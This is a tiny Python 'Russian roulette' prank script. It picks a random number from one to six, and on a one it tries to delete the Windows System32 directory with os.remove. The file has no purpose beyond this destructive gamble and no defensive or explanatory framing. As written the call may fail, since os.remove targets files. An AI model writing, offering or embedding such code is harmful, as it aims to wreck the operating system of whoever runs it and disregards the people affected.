import random
import os

bullet = random.randint(1, 6)
print("Bullet:", bullet)
help = input("")

if bullet == 1:
    os.remove("C:\Windows\System32")